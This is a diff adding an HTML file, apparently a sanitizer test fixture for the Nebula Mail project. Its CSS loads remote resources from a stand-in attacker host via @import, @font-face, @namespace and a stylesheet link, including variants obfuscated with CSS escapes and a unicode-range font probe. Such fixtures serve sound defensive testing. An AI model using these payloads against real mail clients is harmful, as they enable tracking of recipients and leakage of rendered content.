@@ -1,0 +1,15 @@
+<!-- SPDX-FileCopyrightText: 2026 Nebula Mail contributors -->
+<!-- SPDX-License-Identifier: AGPL-3.0-only -->
+<html><head>
+<style>
+@import url(https://attacker.example/a.css);
+@import "https://attacker.example/b.css";
+@import 'https://attacker.example/c.css' screen;
+@\69mport url(https://attacker.example/escaped-import.css);
+@font-face { font-family: Leak; src: url(https://attacker.example/font.woff2) format("woff2"), local("Arial"); unicode-range: U+0041; }
+@font-face { font-family: Leak2; src: u\72l(https://attacker.example/escaped-font.woff); }
+@namespace svg url(https://attacker.example/ns);
+body { font-family: Leak, sans-serif; }
+</style>
+<link rel="stylesheet" href="https://attacker.example/link.css">
+</head><body><p>Fonts and imports</p></body></html>
